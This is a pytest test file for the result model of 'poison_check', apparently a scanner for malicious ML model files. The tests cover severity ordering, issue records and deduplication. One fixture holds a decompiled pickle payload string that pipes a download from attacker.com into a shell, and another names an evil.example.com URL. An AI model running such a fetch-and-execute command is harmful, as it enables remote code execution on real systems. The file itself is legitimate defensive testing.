"""Тесты для poison_check/core/result.py."""

from datetime import datetime
from pathlib import Path

import pytest

from poison_check.core.result import (
    Confidence,
    EmbeddedSignature,
    FileResult,
    Issue,
    MLContext,
    OpcodeInfo,
    Reference,
    ReduceCall,
    ScanResult,
    Severity,
    StringInfo,
    Summary,
    TensorInfo,
    dedupe_issues,
)


# ---------------------------------------------------------------------------
# Вспомогательные фабрики
# ---------------------------------------------------------------------------


def make_issue(
    code: str = "MLS-PKL-001",
    severity: Severity = Severity.HIGH,
    confidence: Confidence = Confidence.HIGH,
    message: str = "Тестовая проблема",
    location: str = "test.pkl:0",
) -> Issue:
    return Issue(
        code=code,
        severity=severity,
        confidence=confidence,
        message=message,
        location=location,
    )


def make_scan_result(
    issues_per_file: dict[str, list[Issue]] | None = None,
) -> ScanResult:
    results: dict[Path, FileResult] = {}
    if issues_per_file:
        for path_str, issues in issues_per_file.items():
            path = Path(path_str)
            results[path] = FileResult(
                file_path=path,
                scanner_name="test_scanner",
                issues=issues,
            )
    return ScanResult(
        tool_version="0.1.0",
        timestamp=datetime(2026, 4, 27, 12, 0, 0),
        duration_ms=100.0,
        scanned_paths=[Path(p) for p in (issues_per_file or {}).keys()],
        results_per_file=results,
    )


# ---------------------------------------------------------------------------
# Severity — сортировка и сравнение
# ---------------------------------------------------------------------------


class TestSeverityOrdering:
    def test_critical_greater_than_all(self) -> None:
        assert Severity.CRITICAL > Severity.HIGH
        assert Severity.CRITICAL > Severity.MEDIUM
        assert Severity.CRITICAL > Severity.LOW
        assert Severity.CRITICAL > Severity.INFO

    def test_info_less_than_all(self) -> None:
        assert Severity.INFO < Severity.LOW
        assert Severity.INFO < Severity.MEDIUM
        assert Severity.INFO < Severity.HIGH
        assert Severity.INFO < Severity.CRITICAL

    def test_sorted_returns_ascending_order(self) -> None:
        shuffled = [Severity.HIGH, Severity.INFO, Severity.CRITICAL, Severity.LOW, Severity.MEDIUM]
        expected = [Severity.INFO, Severity.LOW, Severity.MEDIUM, Severity.HIGH, Severity.CRITICAL]
        assert sorted(shuffled) == expected

    def test_ge_with_same_value(self) -> None:
        assert Severity.HIGH >= Severity.HIGH

    def test_le_with_same_value(self) -> None:
        assert Severity.MEDIUM <= Severity.MEDIUM

    def test_max_picks_highest(self) -> None:
        values = [Severity.LOW, Severity.CRITICAL, Severity.MEDIUM]
        assert max(values) == Severity.CRITICAL

    def test_level_property_values(self) -> None:
        assert Severity.INFO.level == 0
        assert Severity.LOW.level == 1
        assert Severity.MEDIUM.level == 2
        assert Severity.HIGH.level == 3
        assert Severity.CRITICAL.level == 4

    def test_not_implemented_for_non_severity(self) -> None:
        result = Severity.HIGH.__lt__(42)
        assert result is NotImplemented


# ---------------------------------------------------------------------------
# Issue — создание с минимальными и полными полями
# ---------------------------------------------------------------------------


class TestIssueCreation:
    def test_minimal_fields(self) -> None:
        issue = Issue(
            code="MLS-PKL-001",
            severity=Severity.HIGH,
            confidence=Confidence.HIGH,
            message="Тест",
            location="test.pkl:0",
        )
        assert issue.code == "MLS-PKL-001"
        assert issue.severity == Severity.HIGH
        assert issue.confidence == Confidence.HIGH
        assert issue.why is None
        assert issue.remediation is None
        assert issue.decompiled_code is None
        assert issue.references == []
        assert issue.compliance_tags == []
        assert issue.details == {}

    def test_full_fields(self) -> None:
        ref = Reference(type="cve", id="CVE-2025-32434")
        issue = Issue(
            code="MLS-PKL-001",
            severity=Severity.CRITICAL,
            confidence=Confidence.CERTAIN,
            message="RCE через pickle",
            location="model.pt:data.pkl:1234",
            details={"module": "os", "function": "system", "opcode": "REDUCE"},
            why="os.system выполняет произвольные команды ОС",
            remediation="Пересохраните модель в формате safetensors",
            decompiled_code="import os\nos.system('curl attacker.com | sh')",
            references=[ref],
            compliance_tags=["owasp-ml:ml03", "fstec:ubi-067"],
        )
        assert issue.severity == Severity.CRITICAL
        assert issue.confidence == Confidence.CERTAIN
        assert issue.details["module"] == "os"
        assert len(issue.references) == 1
        assert issue.references[0].id == "CVE-2025-32434"
        assert "owasp-ml:ml03" in issue.compliance_tags

    def test_references_are_independent_per_instance(self) -> None:
        issue_a = make_issue(code="A")
        issue_b = make_issue(code="B")
        issue_a.references.append(Reference(type="cve", id="CVE-2025-00001"))
        assert issue_b.references == []


# ---------------------------------------------------------------------------
# ScanResult.has_issues_above()
# ---------------------------------------------------------------------------


class TestHasIssuesAbove:
    def test_empty_result_returns_false(self) -> None:
        result = make_scan_result()
        assert result.has_issues_above(Severity.INFO) is False

    def test_critical_is_above_high(self) -> None:
        result = make_scan_result({"m.pt": [make_issue(severity=Severity.CRITICAL)]})
        assert result.has_issues_above(Severity.HIGH) is True

    def test_critical_satisfies_critical_threshold(self) -> None:
        result = make_scan_result({"m.pt": [make_issue(severity=Severity.CRITICAL)]})
        assert result.has_issues_above(Severity.CRITICAL) is True

    def test_low_does_not_exceed_high(self) -> None:
        result = make_scan_result({"m.pt": [make_issue(severity=Severity.LOW)]})
        assert result.has_issues_above(Severity.HIGH) is False

    def test_mixed_severities(self) -> None:
        issues = [make_issue(severity=Severity.LOW), make_issue(severity=Severity.MEDIUM)]
        result = make_scan_result({"m.pt": issues})
        assert result.has_issues_above(Severity.HIGH) is False
        assert result.has_issues_above(Severity.MEDIUM) is True
        assert result.has_issues_above(Severity.LOW) is True

    def test_has_critical_property_true(self) -> None:
        result = make_scan_result({"m.pt": [make_issue(severity=Severity.CRITICAL)]})
        assert result.has_critical is True

    def test_has_critical_property_false(self) -> None:
        result = make_scan_result({"m.pt": [make_issue(severity=Severity.HIGH)]})
        assert result.has_critical is False

    def test_issues_across_multiple_files(self) -> None:
        result = make_scan_result({
            "clean.pt": [make_issue(severity=Severity.LOW)],
            "bad.pkl": [make_issue(severity=Severity.CRITICAL)],
        })
        assert result.has_issues_above(Severity.CRITICAL) is True


# ---------------------------------------------------------------------------
# ScanResult.issues_by_severity()
# ---------------------------------------------------------------------------


class TestIssuesBySeverity:
    def test_empty_result_has_all_keys(self) -> None:
        result = make_scan_result()
        by_sev = result.issues_by_severity()
        assert set(by_sev.keys()) == set(Severity)
        assert all(v == [] for v in by_sev.values())

    def test_groups_correctly(self) -> None:
        issues = [
            make_issue(code="A", severity=Severity.CRITICAL),
            make_issue(code="B", severity=Severity.HIGH),
            make_issue(code="C", severity=Severity.CRITICAL),
            make_issue(code="D", severity=Severity.LOW),
        ]
        result = make_scan_result({"model.pt": issues})
        by_sev = result.issues_by_severity()
        assert len(by_sev[Severity.CRITICAL]) == 2
        assert len(by_sev[Severity.HIGH]) == 1
        assert len(by_sev[Severity.LOW]) == 1
        assert by_sev[Severity.MEDIUM] == []
        assert by_sev[Severity.INFO] == []

    def test_aggregates_issues_from_multiple_files(self) -> None:
        result = make_scan_result({
            "model1.pt": [make_issue(code="X", severity=Severity.HIGH)],
            "model2.pkl": [make_issue(code="Y", severity=Severity.HIGH)],
        })
        by_sev = result.issues_by_severity()
        assert len(by_sev[Severity.HIGH]) == 2

    def test_issue_codes_preserved(self) -> None:
        issues = [make_issue(code="MLS007", severity=Severity.MEDIUM)]
        result = make_scan_result({"m.pkl": issues})
        medium = result.issues_by_severity()[Severity.MEDIUM]
        assert medium[0].code == "MLS007"


# ---------------------------------------------------------------------------
# ScanResult — вычисляемые свойства
# ---------------------------------------------------------------------------


class TestScanResultProperties:
    def test_worst_severity_none_when_no_issues(self) -> None:
        assert make_scan_result().worst_severity is None

    def test_worst_severity_single_issue(self) -> None:
        result = make_scan_result({"m.pt": [make_issue(severity=Severity.MEDIUM)]})
        assert result.worst_severity == Severity.MEDIUM

    def test_worst_severity_picks_maximum(self) -> None:
        issues = [
            make_issue(severity=Severity.LOW),
            make_issue(severity=Severity.CRITICAL),
            make_issue(severity=Severity.MEDIUM),
        ]
        result = make_scan_result({"m.pt": issues})
        assert result.worst_severity == Severity.CRITICAL

    def test_has_errors_false_when_no_errors(self) -> None:
        result = make_scan_result({"m.pt": [make_issue()]})
        assert result.has_errors is False

    def test_has_errors_true_when_file_failed(self) -> None:
        path = Path("broken.pkl")
        fr = FileResult(file_path=path, scanner_name="test", error="UnicodeDecodeError")
        result = ScanResult(
            tool_version="0.1.0",
            timestamp=datetime(2026, 4, 27),
            duration_ms=5.0,
            results_per_file={path: fr},
        )
        assert result.has_errors is True


# ---------------------------------------------------------------------------
# Вспомогательные dataclass'ы
# ---------------------------------------------------------------------------


class TestSupportingDataclasses:
    def test_opcode_info_defaults(self) -> None:
        op = OpcodeInfo(position=100, opcode="REDUCE")
        assert op.arg is None

    def test_opcode_info_with_arg(self) -> None:
        op = OpcodeInfo(position=0, opcode="SHORT_BINUNICODE", arg="hello")
        assert op.arg == "hello"

    def test_string_info_default_encoding(self) -> None:
        si = StringInfo(value="http://evil.example.com", position=42)
        assert si.encoding == "utf-8"

    def test_reduce_call(self) -> None:
        rc = ReduceCall(module="os", name="system", position=200)
        assert rc.module == "os"
        assert rc.name == "system"

    def test_tensor_info_empty_shape_default(self) -> None:
        ti = TensorInfo(name="weight", dtype="float32")
        assert ti.shape == []

    def test_tensor_info_with_shape(self) -> None:
        ti = TensorInfo(name="weight", dtype="float32", shape=[768, 768])
        assert ti.shape == [768, 768]

    def test_embedded_signature(self) -> None:
        es = EmbeddedSignature(signature_type="ELF", offset=4096, size=8192)
        assert es.signature_type == "ELF"
        assert es.offset == 4096

    def test_ml_context(self) -> None:
        ctx = MLContext(framework="pytorch", confidence=0.95)
        assert ctx.confidence == 0.95
        assert ctx.detected_patterns == []

    def test_ml_context_with_patterns(self) -> None:
        ctx = MLContext(
            framework="sklearn",
            confidence=0.8,
            detected_patterns=["sklearn.linear_model", "sklearn.preprocessing"],
        )
        assert len(ctx.detected_patterns) == 2

    def test_reference(self) -> None:
        ref = Reference(type="bdu", id="УБИ.067")
        assert ref.type == "bdu"
        assert ref.id == "УБИ.067"

    def test_summary_defaults(self) -> None:
        s = Summary()
        assert s.critical == 0
        assert s.worst_severity is None
        assert s.blocked_by_policy is False


# ---------------------------------------------------------------------------
# dedupe_issues — схлопывание дублей без потери независимых находок
# ---------------------------------------------------------------------------


class TestDedupeIssuesWithoutAnchor:
    """location = голый путь к файлу: разные code = разные угрозы."""

    def test_two_different_codes_on_bare_path_are_kept(self) -> None:
        """MLS-PKL-002 (homoglyph) + MLS-PKL-003 (PERSID) на одном пути → 2 issue.

        Оба детектора пишут location без позиционного якоря. Раньше группировка
        по одному location схлопывала их в одну запись и вторая находка терялась.
        """
        bare = "/models/mal.pkl"
        homoglyph = make_issue(
            code="MLS-PKL-002",
            message="Не-ASCII символы в GLOBAL/INST opcode",
            location=bare,
        )
        persid = make_issue(
            code="MLS-PKL-003",
            message="Обнаружен PERSID opcode",
            location=bare,
        )

        deduped = dedupe_issues([homoglyph, persid])

        assert len(deduped) == 2
        assert [i.code for i in deduped] == ["MLS-PKL-002", "MLS-PKL-003"]

    def test_identical_code_and_location_collapses_to_one(self) -> None:
        """Два одинаковых (code, location) → 1 запись (проход 1)."""
        bare = "/models/mal.pkl"
        first = make_issue(code="MLS-PKL-002", location=bare)
        second = make_issue(code="MLS-PKL-002", location=bare)

        deduped = dedupe_issues([first, second])

        assert len(deduped) == 1
        assert deduped[0].code == "MLS-PKL-002"

    def test_generic_and_specific_on_bare_path_are_kept(self) -> None:
        """Без якоря даже generic + specific остаются двумя записями.

        Осознанный компромисс: лучше показать лишнюю запись, чем скрыть
        независимую находку в банковском аудите.
        """
        bare = "/models/mal.pkl"
        generic = make_issue(code="MLS-PKL-001", location=bare)
        specific = make_issue(code="MLS-PATTERN-OS-SYSTEM", location=bare)

        deduped = dedupe_issues([generic, specific])

        assert len(deduped) == 2

    def test_three_independent_codes_are_kept(self) -> None:
        """Parse-stop + embedded payload + zip-бомба на одном пути → 3 записи."""
        bare = "/models/mal.pkl"
        issues = [
            make_issue(code="MLS-PKL-004", location=bare),
            make_issue(code="MLS-PKL-005", location=bare),
            make_issue(code="MLS-CMP-001", location=bare, severity=Severity.MEDIUM),
        ]

        deduped = dedupe_issues(issues)

        assert [i.code for i in deduped] == ["MLS-PKL-004", "MLS-PKL-005", "MLS-CMP-001"]
        # severity независимых находок не «подтягивается» вверх
        assert deduped[2].severity == Severity.MEDIUM

    def test_empty_location_is_not_merged_across_codes(self) -> None:
        """Пустой location (joblib-сканер) якоря не имеет — не мержим."""
        deduped = dedupe_issues([
            make_issue(code="MLS-PKL-002", location=""),
            make_issue(code="MLS-PKL-003", location=""),
        ])
        assert len(deduped) == 2


class TestDedupeIssuesWithAnchor:
    """location с позиционным якорем: одна точка = одна угроза, мержим."""

    def test_offset_anchor_merges(self) -> None:
        """``:offset N`` — якорь от Blocklist/CVE-детекторов."""
        loc = "/models/mal.pkl:offset 42"
        deduped = dedupe_issues([
            make_issue(code="MLS-PKL-001", location=loc),
            make_issue(code="MLS-PATTERN-OS-SYSTEM", location=loc, severity=Severity.CRITICAL),
        ])
        assert len(deduped) == 1
        assert deduped[0].code == "MLS-PATTERN-OS-SYSTEM"
        assert deduped[0].severity == Severity.CRITICAL

    def test_parenthesised_offset_anchor_merges(self) -> None:
        """`` (offset N)`` — якорь от Network/Secrets/Executable-детекторов."""
        loc = "/models/mal.pkl (offset 128)"
        deduped = dedupe_issues([
            make_issue(code="MLS-NET-001", location=loc),
            make_issue(code="MLS-SEC-001", location=loc),
        ])
        assert len(deduped) == 1

    def test_global_anchor_merges(self) -> None:
        """``#module.name`` — якорь от AllowlistDetector."""
        loc = "/models/mal.pkl#os.system"
        deduped = dedupe_issues([
            make_issue(code="MLS-ALW-001", location=loc),
            make_issue(code="MLS-PKL-001", location=loc),
        ])
        assert len(deduped) == 1
        assert deduped[0].code == "MLS-ALW-001"

    def test_metadata_key_anchor_merges(self) -> None:
        """``metadata key:`` — якорь от SecretsDetector по метаданным."""
        loc = "/models/model.safetensors (metadata key: 'token')"
        deduped = dedupe_issues([
            make_issue(code="MLS-SEC-001", location=loc),
            make_issue(code="MLS-SEC-002", location=loc),
        ])
        assert len(deduped) == 1

    def test_bare_path_with_hash_in_filename_is_not_anchor(self) -> None:
        """'#' в имени файла не считается якорем: ``1.pkl`` — не ``module.name``.

        Якорь AllowlistDetector — dotted-путь из Python-идентификаторов,
        сегмент, начинающийся с цифры, под него не подходит.
        """
        loc = "/models/model#1.pkl"
        deduped = dedupe_issues([
            make_issue(code="MLS-PKL-002", location=loc),
            make_issue(code="MLS-PKL-003", location=loc),
        ])
        assert len(deduped) == 2


class TestDedupeIssuesOrdering:
    """Детерминированный порядок первого появления."""

    def test_preserves_first_appearance_order(self) -> None:
        anchored = "/models/a.pkl:offset 7"
        bare = "/models/b.pkl"
        issues = [
            make_issue(code="MLS-PKL-002", location=bare),
            make_issue(code="MLS-PKL-001", location=anchored),
            make_issue(code="MLS-PKL-003", location=bare),
            make_issue(code="MLS-PATTERN-OS-SYSTEM", location=anchored),
        ]

        deduped = dedupe_issues(issues)

        assert [i.code for i in deduped] == [
            "MLS-PKL-002",
            "MLS-PKL-003",
            "MLS-PATTERN-OS-SYSTEM",
        ]

    def test_repeated_calls_are_stable(self) -> None:
        issues = [
            make_issue(code="MLS-PKL-002", location="/models/a.pkl"),
            make_issue(code="MLS-PKL-003", location="/models/a.pkl"),
            make_issue(code="MLS-PKL-004", location="/models/b.pkl"),
        ]
        first = [i.code for i in dedupe_issues(issues)]
        second = [i.code for i in dedupe_issues(issues)]
        assert first == second

    def test_empty_input(self) -> None:
        assert dedupe_issues([]) == []
